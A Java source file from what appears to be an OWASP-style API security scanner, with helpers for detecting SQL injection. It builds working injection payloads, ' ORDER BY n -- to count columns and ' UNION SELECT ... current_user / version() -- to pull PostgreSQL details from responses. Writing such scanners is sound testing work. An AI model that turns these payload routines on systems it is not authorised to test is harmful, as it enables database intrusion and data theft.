package ru.apidefender.scanners.owasp;

import okhttp3.Response;
import ru.apidefender.scanners.SPI;

public class InjectionUtils {
    // Naive token-based Jaccard similarity to compare bodies in boolean-blind
    public static double jaccardSimilarity(String a, String b){
        try {
            java.util.Set<String> sa = new java.util.HashSet<>();
            java.util.Set<String> sb = new java.util.HashSet<>();
            for (String t : a.toLowerCase().split("[^a-z0-9_]+")) if (!t.isBlank()) sa.add(t);
            for (String t : b.toLowerCase().split("[^a-z0-9_]+")) if (!t.isBlank()) sb.add(t);
            if (sa.isEmpty() && sb.isEmpty()) return 1.0;
            java.util.Set<String> inter = new java.util.HashSet<>(sa); inter.retainAll(sb);
            java.util.Set<String> union = new java.util.HashSet<>(sa); union.addAll(sb);
            return union.isEmpty()? 0.0 : (double) inter.size() / (double) union.size();
        } catch (Exception e){ return 0.0; }
    }
    public static Integer detectOrderByColumns(SPI.ScanContext ctx, String base){
        int maxN = 10;
        int lastOk = -1;
        String urlBase = base + (base.contains("?")? "&": "?") + "col=' ORDER BY ";
        String urlEnd = " --";
        String refUrl = base + (base.contains("?")? "&": "?") + "ref=1";
        int refCode = 0; int refLen = 0;
        try (Response rr = ctx.http.request("GET", refUrl, null, null)) {
            refCode = rr.code();
            refLen = rr.peekBody(40_000).string().length();
        } catch (Exception ignored) {}
        for (int n=1; n<=maxN; n++) {
            String url = urlBase + n + urlEnd;
            try (Response r = ctx.http.request("GET", url, null, null)) {
                int code = r.code();
                int len = r.peekBody(40_000).string().length();
                boolean similar = (code == refCode) && Math.abs(len-refLen) <= (refLen*0.15 + 50);
                if (similar) {
                    lastOk = n;
                } else {
                    break;
                }
            } catch (Exception ignored) { break; }
        }
        return lastOk > 0? lastOk : null;
    }

    public static void tryUnionExtractWithColumnCount(SPI.ScanContext ctx, String base, String p, StringBuilder out, int columns){
        if (ctx.maxExploitOps <= 0) return;
        for (String expr : java.util.List.of("current_user","version()")) {
            boolean ok = false;
            for (int pos = 1; pos <= columns; pos++) {
                StringBuilder sb = new StringBuilder();
                sb.append("u=' UNION SELECT ");
                for (int i=1;i<=columns;i++) {
                    if (i>1) sb.append(",");
                    sb.append(i==pos? expr : "NULL");
                }
                sb.append(" --");
                String url = base + (base.contains("?")? "&": "?") + sb;
                try (Response r = ctx.http.request("GET", url, null, null)) {
                    String body = r.peekBody(80_000).string().toLowerCase();
                    if ((expr.equals("current_user") && (body.contains("postgres") || body.contains("user"))) ||
                        (expr.equals("version()") && body.contains("postgresql"))) {
                        if (out.length()>0) out.append(", ");
                        out.append("union-extract: ").append(expr).append(" через ").append(columns).append(" колонок");
                        ok = true; break;
                    }
                } catch (Exception ignored) {}
            }
            if (!ok) { /* noop */ }
        }
    }
}
